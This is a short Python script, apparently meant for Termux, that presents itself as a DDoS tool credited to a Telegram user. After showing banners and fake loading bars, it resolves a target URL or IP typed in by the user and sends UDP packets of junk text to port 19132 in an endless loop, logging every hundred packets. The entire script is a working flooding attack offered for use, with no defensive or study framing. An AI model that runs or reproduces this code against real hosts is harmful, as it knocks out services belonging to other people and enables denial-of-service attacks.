
import time
import socket
import os

red = '\033[31m'
green = '\033[32m'

os.system("pkg install toilet -y")
os.system("pkg install figlet -y")
os.system("clear")
os.system("toilet -f mono12 -F gay DDOS")
print(f"{green}==================================")
print(" Junai ")
print(" my telegram id: @xjunai ")
print("   =====================================")

target = input(f"{green}Enter Target url or Ip : ")
target = target.replace("http://", "").replace("https://", "").replace("www.", "")
ip = socket.gethostbyname(target)
port = 19132
joker = "DDOSjsjsjjdjdjdjdjjjjjjjjjiiiiiiiopppkkkkjjjjjhhhbbbbgbvvvvvvvvvvvvhhyggggh"

os.system("clear")
os.system("toilet -f mono12 LOADING | lolcat")
print("Loading{~~~ }5%")
time.sleep(3)
print("Loading{~~~~~ }10%")
time.sleep(3)
print("Loading{~~~~~~~~ }40%")
time.sleep(3)
print("Loading{~~~~~~~~~~~~~~ }90%")
time.sleep(3)
print("Loading{~~~~~~~~~~~~~~~~}100%")
os.system("clear")
os.system("figlet Attack_Starting")

try:
    counter = 0  # عداد للحزم المرسلة
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(joker, "UTF-8"), (ip, port))
        counter += 1
        if counter % 100 == 0:  # طباعة رسالة لكل 100 حزمة مرسلة
            print(f"Sent {counter} packets to {ip}:{port}")
except KeyboardInterrupt:
    print("\nProcess interrupted by user.")
except Exception as e:
    print(f"An error occurred: {e}")
finally:
    sock.close()
    print("Socket closed.")
